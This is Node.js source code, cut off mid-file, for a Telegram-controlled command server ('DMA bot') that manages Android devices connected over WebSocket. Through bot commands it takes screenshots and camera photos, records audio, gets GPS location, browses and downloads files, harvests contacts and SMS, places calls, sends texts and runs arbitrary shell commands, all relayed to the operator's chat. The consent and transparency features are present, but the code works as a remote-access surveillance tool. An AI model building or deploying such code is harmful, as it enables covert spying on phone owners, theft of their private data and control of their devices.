require('dotenv').config();
const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const https = require('https');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const helmet = require('helmet');
const NodeCache = require('node-cache');
const rateLimit = require('express-rate-limit');

// ============================================
// CONFIGURATION
// ============================================
const token = process.env.TELEGRAM_BOT_TOKEN;
const adminId = process.env.TELEGRAM_CHAT_ID;
const PORT = process.env.PORT || 8999;

// Security check
if (!token || token.includes('AAHGZy_dy804ZwHoq48SnIK_OadCN2wcQxA')) {
    console.error('❌ SECURITY ALERT: Using compromised token! Regenerate via @BotFather');
    process.exit(1);
}

// ============================================
// EXPRESS SETUP
// ============================================
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server, clientTracking: true });

// Fix for Render/Proxy - trust first proxy
app.set('trust proxy', 1);

// Middleware
app.use(helmet({
    contentSecurityPolicy: false,
}));
app.use(express.json({ limit: '50mb' }));

// Rate limiting - FIXED for proxy
const apiLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100,
    validate: {
        xForwardedForHeader: false,
        trustProxy: false
    }
});
app.use('/api/', apiLimiter);

// ============================================
// CACHE & DATA STRUCTURES
// ============================================
const commandCache = new NodeCache({ stdTTL: 2 });
const messageCache = new NodeCache({ stdTTL: 5 });
let bot = null;
const connectedDevices = new Map();
const pendingCommands = new Map();
const userSessions = new Map();

// ============================================
// DIRECTORY CREATION
// ============================================
['uploads', 'logs', 'screenshots', 'recordings', 'photos', 'temp'].forEach(dir => {
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
});

// ============================================
// FILE UPLOAD CONFIGURATION
// ============================================
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        const type = req.headers['file-type'] || 'unknown';
        let dir = `uploads/${type}`;
        
        if (type.includes('screenshot')) dir = 'screenshots';
        else if (type.includes('audio') || type.includes('recording')) dir = 'recordings';
        else if (type.includes('photo') || type.includes('camera')) dir = 'photos';
        
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        cb(null, dir);
    },
    filename: (req, file, cb) => {
        const deviceId = req.headers['device-id'] || 'unknown';
        const timestamp = Date.now();
        const ext = path.extname(file.originalname);
        cb(null, `${deviceId}-${timestamp}${ext}`);
    }
});

const upload = multer({
    storage,
    limits: { fileSize: 100 * 1024 * 1024 },
    fileFilter: (req, file, cb) => {
        const allowedTypes = [
            'image/jpeg', 'image/png', 'image/gif',
            'video/mp4', 'video/3gpp',
            'audio/mpeg', 'audio/mp3', 'audio/wav',
            'application/pdf', 'text/plain',
            'application/vnd.android.package-archive'
        ];
        
        if (allowedTypes.includes(file.mimetype) || 
            /\.(jpg|jpeg|png|gif|mp4|3gp|mp3|wav|txt|pdf|apk)$/i.test(file.originalname)) {
            cb(null, true);
        } else {
            cb(new Error('File type not allowed'), false);
        }
    }
});

// ============================================
// HELPER FUNCTIONS
// ============================================

// Logging
function logEvent(event, deviceId = 'system', details = '') {
    const timestamp = new Date().toISOString();
    const logEntry = `[${timestamp}] [${deviceId}] ${event}: ${details}\n`;
    
    if (event.includes('ERROR')) {
        console.error('\x1b[31m%s\x1b[0m', logEntry.trim());
    } else if (event.includes('CONNECTED')) {
        console.log('\x1b[32m%s\x1b[0m', logEntry.trim());
    } else if (event.includes('COMMAND')) {
        console.log('\x1b[36m%s\x1b[0m', logEntry.trim());
    } else {
        console.log(logEntry.trim());
    }
    
    try {
        fs.appendFileSync('logs/server.log', logEntry);
    } catch (e) {}
}

// Telegram API helper (no axios)
function telegramRequest(method, params = {}) {
    return new Promise((resolve, reject) => {
        const queryString = Object.keys(params)
            .map(key => `${encodeURIComponent(key)}=${encodeURIComponent(params[key])}`)
            .join('&');
        
        const options = {
            hostname: 'api.telegram.org',
            path: `/bot${token}/${method}${queryString ? '?' + queryString : ''}`,
            method: 'GET',
            headers: { 'Content-Type': 'application/json' }
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => {
                try {
                    resolve(JSON.parse(data));
                } catch (e) {
                    reject(e);
                }
            });
        });

        req.on('error', reject);
        req.end();
    });
}

// Send long messages (Telegram 4096 limit)
async function sendLongMessage(chatId, text, parseMode = 'Markdown') {
    const MAX_LENGTH = 4096;
    
    if (text.length <= MAX_LENGTH) {
        return await bot.sendMessage(chatId, text, { parse_mode: parseMode }).catch(e => {});
    }
    
    const tempFile = path.join(__dirname, 'temp', `output_${Date.now()}.txt`);
    fs.writeFileSync(tempFile, text.replace(/\*|`|_/g, ''));
    
    return await bot.sendDocument(chatId, tempFile, {
        caption: `📄 Output (${Math.ceil(text.length / 1024)}KB)`
    }).then(() => {
        setTimeout(() => {
            if (fs.existsSync(tempFile)) fs.unlinkSync(tempFile);
        }, 60000);
    }).catch(e => {});
}

// Format bytes
function formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}

// Session management
function setUserSession(userId, data) {
    userSessions.set(userId, { ...data, timestamp: Date.now() });
}

function getUserSession(userId) {
    return userSessions.get(userId);
}

function clearUserSession(userId) {
    userSessions.delete(userId);
}

// ============================================
// KEYBOARD DEFINITIONS - MINIMAL & CLEAN
// ============================================

// ✅ MAIN KEYBOARD - Only 2 buttons!
const mainKeyboard = {
    reply_markup: {
        keyboard: [
            [{ text: '📱 Devices' }],
            [{ text: '❓ Help' }]
        ],
        resize_keyboard: true,
        one_time_keyboard: false
    }
};

// ✅ DEVICE SELECTION KEYBOARD - Just device names
const deviceSelectionKeyboard = (devices) => {
    const buttons = [];
    devices.forEach((device, id) => {
        const model = device.deviceInfo?.model?.split(' ')[0] || 'Android';
        const shortId = id.substring(0, 4);
        buttons.push([{ text: `📱 ${model} (${shortId})` }]);
    });
    buttons.push([{ text: '🔙 Back' }]);
    
    return {
        reply_markup: {
            keyboard: buttons,
            resize_keyboard: true,
            one_time_keyboard: true
        }
    };
};

// ✅ THE ONE AND ONLY DEVICE ACTION MENU - ALL 18 ACTIONS IN ONE PLACE!
const deviceActionMenu = (deviceId) => ({
    reply_markup: {
        inline_keyboard: [
            // Row 1: Device Info & Status
            [
                { text: 'ℹ️ Info', callback_data: `info_${deviceId}` },
                { text: '📱 Apps', callback_data: `apps_${deviceId}` }
            ],
            // Row 2: Media Capture
            [
                { text: '📸 Screenshot', callback_data: `screenshot_${deviceId}` },
                { text: '📷 Camera', callback_data: `camera_${deviceId}` },
                { text: '🎤 Record', callback_data: `record_${deviceId}` }
            ],
            // Row 3: Location & Files
            [
                { text: '📍 Location', callback_data: `location_${deviceId}` },
                { text: '📁 Browse', callback_data: `browse_${deviceId}` },
                { text: '📥 Download', callback_data: `download_${deviceId}` }
            ],
            // Row 4: Communication
            [
                { text: '📞 Call', callback_data: `call_${deviceId}` },
                { text: '💬 SMS', callback_data: `sms_${deviceId}` }
            ],
            // Row 5: Data Access
            [
                { text: '📒 Contacts', callback_data: `contacts_${deviceId}` },
                { text: '📨 Messages', callback_data: `messages_${deviceId}` }
            ],
            // Row 6: Advanced
            [
                { text: '🖥️ Shell', callback_data: `shell_${deviceId}` },
                { text: '🔐 Privacy', callback_data: `privacy_${deviceId}` }
            ],
            // Row 7: Consent Management
            [
                { text: '🚫 Revoke', callback_data: `revoke_${deviceId}` },
                { text: '⚠️ Revoke All', callback_data: `revoke_all_${deviceId}` }
            ]
        ]
    }
});

// ✅ REMOVE KEYBOARD
const removeKeyboard = { 
    reply_markup: { remove_keyboard: true } 
};

// ============================================
// BOT COMMANDS - ALL 20 VISIBLE
// ============================================
async function setupBotCommands() {
    if (!bot) return;
    
    const commands = [
        { command: 'start', description: '🚀 Start DMA bot' },
        { command: 'help', description: '❓ Show help' },
        { command: 'keyboard', description: '⌨️ Show keyboard' },
        { command: 'list', description: '📱 List devices' },
        { command: 'info', description: 'ℹ️ Device info (ID)' },
        { command: 'screenshot', description: '📸 Take screenshot (ID)' },
        { command: 'camera', description: '📷 Take photo (ID + front/rear)' },
        { command: 'record', description: '🎤 Record audio (ID + seconds)' },
        { command: 'location', description: '📍 Get location (ID)' },
        { command: 'browse', description: '📁 Browse files (ID)' },
        { command: 'download', description: '📥 Download file (ID + path)' },
        { command: 'call', description: '📞 Make call (ID + number)' },
        { command: 'sms', description: '💬 Send SMS (ID + number + text)' },
        { command: 'contacts', description: '📒 Get contacts (ID)' },
        { command: 'messages', description: '📨 Get messages (ID)' },
        { command: 'apps', description: '📱 List apps (ID)' },
        { command: 'shell', description: '🖥️ Run command (ID + cmd)' },
        { command: 'privacy', description: '🔐 Manage consents (ID)' },
        { command: 'revoke', description: '🚫 Revoke consent (ID + type)' },
        { command: 'revoke_all', description: '⚠️ Revoke all (ID)' }
    ];

    try {
        await bot.setMyCommands(commands);
        console.log('✅ 20 commands registered successfully');
    } catch (error) {
        console.error('❌ Failed to set commands:', error.message);
    }
}

// ============================================
// BOT INITIALIZATION
// ============================================
async function initializeBot() {
    return new Promise((resolve, reject) => {
        try {
            bot = new TelegramBot(token, {
                polling: true,
                onlyFirstMatch: true,
                filepath: false, // Fix deprecation warning
                request: { 
                    agentOptions: { 
                        keepAlive: true, 
                        family: 4 
                    } 
                }
            });

            bot.getMe().then((me) => {
                console.log(`✅ Bot connected: @${me.username}`);
                resolve(bot);
            }).catch(reject);

            bot.on('polling_error', (error) => {
                if (error.code === 'ETELEGRAM' && error.message.includes('409')) {
                    console.error('\n❌ Another bot instance is running!');
                    console.error('💡 Run: killall node');
                    bot.stopPolling();
                } else {
                    console.error('⚠️ Polling error:', error.message);
                }
            });

        } catch (error) {
            reject(error);
        }
    });
}

async function startBot() {
    try {
        const webhookInfo = await telegramRequest('getWebhookInfo');
        if (webhookInfo.ok && webhookInfo.result.url) {
            console.log('⚠️ Bot has active webhook. Deleting...');
            await telegramRequest('deleteWebhook', { drop_pending_updates: true });
            console.log('✅ Webhook deleted');
        }
        
        await initializeBot();
        setupBotCommandHandlers();
        await setupBotCommands();
        return bot;
    } catch (error) {
        console.error('❌ Bot start failed:', error.message);
        return null;
    }
}

// ============================================
// WEBSOCKET SERVER
// ============================================
wss.on('connection', (ws, req) => {
    try {
        const deviceId = req.headers['device-id'];
        const deviceModel = req.headers['device-model'] || 'Unknown';
        const androidVersion = req.headers['android-version'] || 'Unknown';
        
        if (!deviceId || !req.headers['authorization']) {
            return ws.close(1008, 'Unauthorized');
        }

        const deviceInfo = {
            id: deviceId,
            model: deviceModel,
            android: androidVersion,
            connectedAt: new Date().toISOString(),
            lastSeen: Date.now()
        };

        ws.deviceId = deviceId;
        
        connectedDevices.set(deviceId, { 
            ws, 
            deviceInfo, 
            lastSeen: Date.now(),
            consents: new Map()
        });

        if (bot) {
            bot.sendMessage(adminId, 
                `📱 *Device Connected*\n` +
                `Model: \`${deviceModel}\`\n` +
                `Android: ${androidVersion}\n` +
                `ID: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        }

        ws.on('message', (data) => {
            try {
                const msg = JSON.parse(data);
                handleDeviceMessage(deviceId, msg);
            } catch (e) {}
            const dev = connectedDevices.get(deviceId);
            if (dev) dev.lastSeen = Date.now();
        });

        ws.on('close', () => {
            connectedDevices.delete(deviceId);
            if (bot) {
                bot.sendMessage(adminId, 
                    `📴 *Device Disconnected*\n\`${deviceId.substring(0, 8)}...\``, 
                    { parse_mode: 'Markdown' }
                ).catch(e => {});
            }
        });

        // Request device info immediately
        ws.send(JSON.stringify({
            type: 'command',
            id: uuidv4(),
            command: 'get_device_info',
            timestamp: Date.now()
        }));

    } catch (error) {
        ws.close(1011, 'Server error');
    }
});

// ============================================
// DEVICE MESSAGE HANDLERS
// ============================================
function handleDeviceMessage(deviceId, message) {
    const device = connectedDevices.get(deviceId);
    if (!device) return;

    switch (message.type) {
        case 'response': handleCommandResponse(deviceId, message); break;
        case 'device_info': updateDeviceInfo(deviceId, message.data); break;
        case 'consent_status': updateConsentStatus(deviceId, message.data); break;
        case 'transparency_log': handleTransparencyLog(deviceId, message.data); break;
        case 'file_upload': handleFileUpload(deviceId, message); break;
        case 'error': 
            if (bot) {
                bot.sendMessage(adminId, 
                    `❌ *Error*\n\`${message.error}\``, 
                    { parse_mode: 'Markdown' }
                ).catch(e => {});
            }
            break;
    }
}

function updateDeviceInfo(deviceId, info) {
    const device = connectedDevices.get(deviceId);
    if (device) {
        device.deviceInfo = { ...device.deviceInfo, ...info };
    }
}

function updateConsentStatus(deviceId, data) {
    const device = connectedDevices.get(deviceId);
    if (device && data.consents) {
        try {
            const consents = JSON.parse(data.consents);
            consents.forEach(c => device.consents.set(c.type, c));
            
            if (bot) {
                let msg = `🔐 *Consents - ${device.deviceInfo?.model || deviceId.substring(0, 6)}*\n━━━━━━━━━━━━━\n`;
                consents.forEach(c => {
                    msg += `• ${c.type}: ${c.active ? '✅' : '❌'}\n`;
                });
                bot.sendMessage(adminId, msg, { parse_mode: 'Markdown' }).catch(e => {});
            }
        } catch (e) {}
    }
}

function handleTransparencyLog(deviceId, data) {
    const device = connectedDevices.get(deviceId);
    if (!device || !data.log) return;
    
    try {
        const logs = JSON.parse(data.log).slice(0, 15);
        let msg = `📋 *Activity Log - ${device.deviceInfo?.model || deviceId.substring(0, 6)}*\n━━━━━━━━━━━━━\n`;
        
        logs.forEach((e, i) => {
            const time = new Date(e.timestamp).toLocaleTimeString();
            msg += `${i+1}. [${time}] ${e.action}\n   ${e.details.substring(0, 50)}\n`;
        });
        
        sendLongMessage(adminId, msg);
    } catch (e) {}
}

function handleFileUpload(deviceId, message) {
    if (bot) {
        bot.sendMessage(adminId, 
            `📁 *File Received*\nDevice: \`${deviceId.substring(0, 8)}...\`\nType: ${message.fileType}`,
            { parse_mode: 'Markdown' }
        ).catch(e => {});
    }
}

// ============================================
// COMMAND RESPONSE HANDLER
// ============================================
function handleCommandResponse(deviceId, response) {
    const device = connectedDevices.get(deviceId);
    const model = device?.deviceInfo?.model?.split(' ')[0] || deviceId.substring(0, 6);
    
    if (!bot) return;
    
    if (!response.success) {
        bot.sendMessage(adminId, 
            `❌ *Failed*\nDevice: ${model}\nError: ${response.error || 'Unknown'}`,
            { parse_mode: 'Markdown' }
        ).catch(e => {});
        return;
    }

    // Location
    if (response.data?.lat && response.data?.lng) {
        bot.sendLocation(adminId, response.data.lat, response.data.lng).then(() => {
            const url = `https://maps.google.com/?q=${response.data.lat},${response.data.lng}`;
            bot.sendMessage(adminId, 
                `📍 *${model}*\nLat: \`${response.data.lat}\`\nLng: \`${response.data.lng}\``,
                { 
                    parse_mode: 'Markdown', 
                    reply_markup: { 
                        inline_keyboard: [[{ text: '🗺️ Map', url }]] 
                    } 
                }
            ).catch(e => {});
        }).catch(e => {});
    }
    
    // Device info
    else if (response.data?.device) {
        const msg = 
`📱 *${response.data.model || 'Device'}*
━━━━━━━━━━━━━
🤖 Android: ${response.data.android || '?'} (SDK ${response.data.sdk || '?'})
🔋 Battery: ${response.data.battery?.toFixed(0) || '?'}%
💾 Free: ${formatBytes(response.data.internal_free)}
📦 Apps: ${response.data.apps_count || 0}
📶 Network: ${response.data.network_type || '?'}
━━━━━━━━━━━━━
ID: \`${deviceId}\``;
        bot.sendMessage(adminId, msg, { parse_mode: 'Markdown' }).catch(e => {});
    }
    
    // Contacts
    else if (response.data?.contacts) {
        try {
            const contacts = JSON.parse(response.data.contacts).slice(0, 20);
            let msg = `📒 *Contacts - ${model}*\n━━━━━━━━━━━━━\n`;
            contacts.forEach((c, i) => {
                msg += `${i+1}. ${c.name || '?'}: \`${c.number}\`\n`;
            });
            sendLongMessage(adminId, msg);
        } catch (e) {}
    }
    
    // Apps
    else if (response.data?.apps) {
        try {
            const apps = JSON.parse(response.data.list).slice(0, 30);
            let msg = `📱 *Apps - ${model}*\n━━━━━━━━━━━━━\nTotal: ${response.data.count}\n\n`;
            apps.forEach((a, i) => {
                const name = a.split('.').pop() || a;
                msg += `${i+1}. ${name}\n`;
            });
            sendLongMessage(adminId, msg);
        } catch (e) {}
    }
    
    // Shell output
    else if (response.output) {
        const output = response.output.substring(0, 1000);
        sendLongMessage(adminId, `🖥️ *Output - ${model}*\n━━━━━━━━━━━━━\n\`\`\`\n${output}\n\`\`\``);
    }
    
    // Consents
    else if (response.data?.consents) {
        updateConsentStatus(deviceId, response.data);
    }
    
    // Log
    else if (response.data?.log) {
        handleTransparencyLog(deviceId, response.data);
    }
    
    // Simple success
    else {
        bot.sendMessage(adminId, `✅ *Done*\nDevice: ${model}`, 
            { parse_mode: 'Markdown' }
        ).catch(e => {});
    }
}

// ============================================
// SEND COMMAND TO DEVICE
// ============================================
function sendCommandToDevice(deviceId, command, data = {}) {
    const device = connectedDevices.get(deviceId);
    if (!device) return false;
    
    try {
        device.ws.send(JSON.stringify({
            type: 'command',
            id: uuidv4(),
            command,
            data,
            timestamp: Date.now()
        }));
        logEvent('COMMAND_SENT', deviceId, `${command}`);
        return true;
    } catch (e) {
        return false;
    }
}

// ============================================
// BOT COMMAND HANDLERS - CLEAN & MINIMAL
// ============================================
function setupBotCommandHandlers() {
    if (!bot) return;

    // === START ===
    bot.onText(/\/start/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) {
            return bot.sendMessage(chatId, '⛔ Unauthorized');
        }
        
        bot.sendMessage(chatId, 
            `🤖 *DMA Bot Ready*\n━━━━━━━━━━━━━\n` +
            `📱 Devices: ${connectedDevices.size}\n` +
            `⚡ Tap '📱 Devices' or type /list`,
            { 
                parse_mode: 'Markdown',
                reply_markup: mainKeyboard.reply_markup 
            }
        ).catch(e => {});
    });

    // === HELP ===
    bot.onText(/\/help/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const help = 
`🤖 *DMA Commands*
━━━━━━━━━━━━━
Type / followed by any command:

*📱 Device*
/list - Show all devices
/info [ID] - Device details

*📸 Media*
/screenshot [ID] - Take screenshot
/camera [ID] [front/rear] - Take photo
/record [ID] [sec] - Record audio

*📍 Location*
/location [ID] - Get GPS

*📁 Files*
/browse [ID] - List files
/download [ID] [path] - Download file

*📞 Communication*
/call [ID] [num] - Make call
/sms [ID] [num] [text] - Send SMS
/contacts [ID] - Get contacts
/messages [ID] - Get SMS

*📱 System*
/apps [ID] - List apps
/shell [ID] [cmd] - Run command

*🔐 Privacy*
/privacy [ID] - View consents
/revoke [ID] [type] - Revoke consent
/revoke_all [ID] - Revoke all

*❓ Other*
/keyboard - Show devices button
/help - This message`;
        
        bot.sendMessage(chatId, help, { parse_mode: 'Markdown' }).catch(e => {});
    });

    // === KEYBOARD ===
    bot.onText(/\/keyboard/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        bot.sendMessage(chatId, '📱 Tap Devices', { 
            reply_markup: mainKeyboard.reply_markup 
        }).catch(e => {});
    });

    // === LIST DEVICES ===
    bot.onText(/\/list/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        showDeviceList(chatId);
    });

    function showDeviceList(chatId) {
        if (connectedDevices.size === 0) {
            return bot.sendMessage(chatId, '📭 No devices connected').catch(e => {});
        }
        
        let text = `📱 *Devices (${connectedDevices.size})*\n━━━━━━━━━━━━━\n`;
        connectedDevices.forEach((d, id) => {
            const model = d.deviceInfo?.model?.split(' ')[0] || '?';
            const battery = d.deviceInfo?.battery ? `${d.deviceInfo.battery.toFixed(0)}%` : '?';
            text += `• ${model} [${battery}] \`${id.substring(0, 6)}...\`\n`;
        });
        
        bot.sendMessage(chatId, text, { 
            parse_mode: 'Markdown',
            reply_markup: deviceSelectionKeyboard(connectedDevices).reply_markup 
        }).catch(e => {});
    }

    // === DEVICE COMMANDS (Slash) ===
    const deviceCommands = [
        'info', 'screenshot', 'location', 'apps', 'contacts', 'messages',
        'privacy', 'revoke_all', 'browse', 'download'
    ];
    
    deviceCommands.forEach(cmd => {
        bot.onText(new RegExp(`\\/${cmd} (.+)`), (msg, match) => {
            const chatId = msg.chat.id;
            if (chatId.toString() !== adminId) return;
            
            const deviceId = match[1];
            const device = connectedDevices.get(deviceId);
            
            if (!device) {
                return bot.sendMessage(chatId, `❌ Device not found`).catch(e => {});
            }
            
            const commandMap = {
                'info': 'get_device_info',
                'screenshot': 'take_screenshot',
                'location': 'get_location',
                'apps': 'list_apps',
                'contacts': 'get_contacts',
                'messages': 'get_messages',
                'privacy': 'get_consents',
                'revoke_all': 'revoke_all_consents',
                'browse': 'list_files',
                'download': 'get_file'
            };
            
            const deviceCmd = commandMap[cmd];
            
            if (cmd === 'browse' || cmd === 'download') {
                setUserSession(chatId, { state: `awaiting_${cmd}_path`, deviceId });
                bot.sendMessage(chatId, `📁 Enter path:`, removeKeyboard).catch(e => {});
            } else if (cmd === 'revoke_all') {
                sendCommandToDevice(deviceId, deviceCmd, { reason: 'Admin revoked all' });
                bot.sendMessage(chatId, `⚠️ Revoking all consents...`).catch(e => {});
            } else {
                sendCommandToDevice(deviceId, deviceCmd);
                bot.sendMessage(chatId, `✅ Command sent`).catch(e => {});
            }
        });
    });

    // === CAMERA ===
    bot.onText(/\/camera (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1];
        const type = match[2].toLowerCase();
        
        if (!connectedDevices.get(deviceId)) {
            return bot.sendMessage(chatId, `❌ Device not found`).catch(e => {});
        }
        
        sendCommandToDevice(deviceId, 'take_photo', { camera: type.includes('front') ? 'front' : 'rear' });
        bot.sendMessage(chatId, `📷 Taking ${type} photo...`).catch(e => {});
    });

    // === RECORD ===
    bot.onText(/\/record (.+) (\d+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1];
        const seconds = parseInt(match[2]);
        
        if (!connectedDevices.get(deviceId)) {
            return bot.sendMessage(chatId, `❌ Device not found`).catch(e => {});
        }
        
        sendCommandToDevice(deviceId, 'record_audio', { seconds });
        bot.sendMessage(chatId, `🎤 Recording ${seconds}s...`).catch(e => {});
    });

    // === CALL ===
    bot.onText(/\/call (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1];
        const number = match[2];
        
        if (!connectedDevices.get(deviceId)) {
            return bot.sendMessage(chatId, `❌ Device not found`).catch(e => {});
        }
        
        sendCommandToDevice(deviceId, 'make_call', { number });
        bot.sendMessage(chatId, `📞 Calling ${number}...`).catch(e => {});
    });

    // === SMS ===
    bot.onText(/\/sms (.+) (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1];
        const number = match[2];
        const message = match[3];
        
        if (!connectedDevices.get(deviceId)) {
            return bot.sendMessage(chatId, `❌ Device not found`).catch(e => {});
        }
        
        sendCommandToDevice(deviceId, 'send_sms', { number, message });
        bot.sendMessage(chatId, `💬 SMS sent to ${number}`).catch(e => {});
    });

    // === SHELL ===
    bot.onText(/\/shell (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1];
        const command = match[2];
        
        if (!connectedDevices.get(deviceId)) {
            return bot.sendMessage(chatId, `❌ Device not found`).catch(e => {});
        }
        
        sendCommandToDevice(deviceId, 'execute', { cmd: command });
        bot.sendMessage(chatId, `🖥️ Executing...`).catch(e => {});
    });

    // === REVOKE ===
    bot.onText(/\/revoke (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1];
        const type = match[2].toUpperCase();
        
        if (!connectedDevices.get(deviceId)) {
            return bot.sendMessage(chatId, `❌ Device not found`).catch(e => {});
        }
        
        sendCommandToDevice(deviceId, 'revoke_consent', { type, reason: 'Admin revoked' });
        bot.sendMessage(chatId, `🚫 Revoked ${type}`).catch(e => {});
    });

    // === MESSAGE HANDLER - BUTTONS ===
    bot.on('message', (msg) => {
        const chatId = msg.chat.id;
        const text = msg.text;
        
        if (chatId.toString() !== adminId || !text) return;
        
        // Main menu buttons
        if (text === '📱 Devices') {
            showDeviceList(chatId);
        }
        else if (text === '❓ Help') {
            bot.sendMessage(chatId, 'Type /help', { 
                reply_markup: mainKeyboard.reply_markup 
            }).catch(e => {});
        }
        else if (text === '🔙 Back') {
            bot.sendMessage(chatId, 'Main menu', { 
                reply_markup: mainKeyboard.reply_markup 
            }).catch(e => {});
            clearUserSession(chatId);
        }
        // Device selection
        else if (text.includes('📱') && text.includes('(')) {
            const deviceEntry = Array.from(connectedDevices.entries()).find(([id]) => 
                text.includes(id.substring(0, 4))
            );
            
            if (deviceEntry) {
                const [deviceId, device] = deviceEntry;
                const model = device.deviceInfo?.model?.split(' ')[0] || 'Device';
                
                // ✅ SINGLE DEVICE ACTION MENU - ALL ACTIONS IN ONE PLACE
                bot.sendMessage(chatId, 
                    `📱 *${model}*\n━━━━━━━━━━━━━\nID: \`${deviceId.substring(0, 8)}...\`\n\n*Select action:*`,
                    { 
                        parse_mode: 'Markdown',
                        reply_markup: deviceActionMenu(deviceId).reply_markup 
                    }
                ).catch(e => {});
                
                clearUserSession(chatId);
            }
        }
        
        // Input handlers
        const session = getUserSession(chatId);
        if (!session) return;
        
        if (session.state === 'awaiting_browse_path' && session.deviceId) {
            sendCommandToDevice(session.deviceId, 'list_files', { path: text.trim() });
            bot.sendMessage(chatId, `📁 Browsing...`, removeKeyboard).catch(e => {});
            clearUserSession(chatId);
        }
        else if (session.state === 'awaiting_download_path' && session.deviceId) {
            sendCommandToDevice(session.deviceId, 'get_file', { path: text.trim() });
            bot.sendMessage(chatId, `📥 Downloading...`, removeKeyboard).catch(e => {});
            clearUserSession(chatId);
        }
    });

    // === CALLBACK QUERY HANDLER - ALL DEVICE ACTIONS ===
    bot.on('callback_query', async (callbackQuery) => {
        const chatId = callbackQuery.message.chat.id;
        const messageId = callbackQuery.message.message_id;
        const data = callbackQuery.data;
        
        if (chatId.toString() !== adminId) return;
        
        // Answer callback immediately
        await bot.answerCallbackQuery(callbackQuery.id).catch(e => {});
        
        // Parse action and deviceId
        const parts = data.split('_');
        const action = parts[0];
        const deviceId = parts.slice(1).join('_'); // Handle device IDs with underscores
        
        const device = connectedDevices.get(deviceId);
        if (!device) {
            return bot.sendMessage(chatId, `❌ Device not found`).catch(e => {});
        }
        
        // Map actions to commands
        switch(action) {
            case 'info':
                sendCommandToDevice(deviceId, 'get_device_info');
                bot.sendMessage(chatId, `ℹ️ Getting device info...`).catch(e => {});
                break;
            case 'apps':
                sendCommandToDevice(deviceId, 'list_apps');
                bot.sendMessage(chatId, `📱 Getting apps list...`).catch(e => {});
                break;
            case 'screenshot':
                sendCommandToDevice(deviceId, 'take_screenshot');
                bot.sendMessage(chatId, `📸 Taking screenshot...`).catch(e => {});
                break;
            case 'camera':
                bot.sendMessage(chatId, 
                    `📷 Select camera:`,
                    {
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: '📷 Front', callback_data: `camera_front_${deviceId}` },
                                    { text: '📷 Rear', callback_data: `camera_rear_${deviceId}` }
                                ]
                            ]
                        }
                    }
                ).catch(e => {});
                break;
            case 'camera_front':
                sendCommandToDevice(deviceId, 'take_photo', { camera: 'front' });
                bot.sendMessage(chatId, `📷 Taking front camera photo...`).catch(e => {});
                break;
            case 'camera_rear':
                sendCommandToDevice(deviceId, 'take_photo', { camera: 'rear' });
                bot.sendMessage(chatId, `📷 Taking rear camera photo...`).catch(e => {});
                break;
            case 'record':
                bot.sendMessage(chatId, 
                    `🎤 Select duration:`,
                    {
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: '5s', callback_data: `record_5_${deviceId}` },
                                    { text: '10s', callback_data: `record_10_${deviceId}` },
                                    { text: '30s', callback_data: `record_30_${deviceId}` }
                                ],
                                [
                                    { text: '1m', callback_data: `record_60_${deviceId}` },
                                    { text: '5m', callback_data: `record_300_${deviceId}` },
                                    { text: '10m', callback_data: `record_600_${deviceId}` }
                                ]
                            ]
                        }
                    }
                ).catch(e => {});
                break;
            case 'record_5':
            case 'record_10':
            case 'record_30':
            case 'record_60':
            case 'record_300':
            case 'record_600':
                const seconds = parseInt(action.split('_')[1]);
                sendCommandToDevice(deviceId, 'record_audio', { seconds });
                bot.sendMessage(chatId, `🎤 Recording ${seconds}s...`).catch(e => {});
                break;
            case 'location':
                sendCommandToDevice(deviceId, 'get_location');
                bot.sendMessage(chatId, `📍 Getting location...`).catch(e => {});
                break;
            case 'browse':
                setUserSession(chatId, { state: 'awaiting_browse_path', deviceId });
                bot.sendMessage(chatId, `📁 Enter path to browse:`, removeKeyboard).catch(e => {});
                break;
            case 'download':
                setUserSession(chatId, { state: 'awaiting_download_path', deviceId });
                bot.sendMessage(chatId, `📥 Enter file path to download:`, removeKeyboard).catch(e => {});
                break;
            case 'call':
                setUserSession(chatId, { state: 'awaiting_call_number', deviceId });
                bot.sendMessage(chatId, `📞 Enter phone number:`, removeKeyboard).catch(e => {});
                break;
            case 'sms':
                setUserSession(chatId, { state: 'awaiting_sms_number', deviceId });
                bot.sendMessage(chatId, `💬 Enter phone number:`, removeKeyboard).catch(e => {});
                break;
            case 'contacts':
                sendCommandToDevice(deviceId, 'get_contacts');
                bot.sendMessage(chatId, `📒 Getting contacts...`).catch(e => {});
                break;
            case 'messages':
                sendCommandToDevice(deviceId, 'get_messages');
                bot.sendMessage(chatId, `📨 Getting messages...`).catch(e => {});
                break;
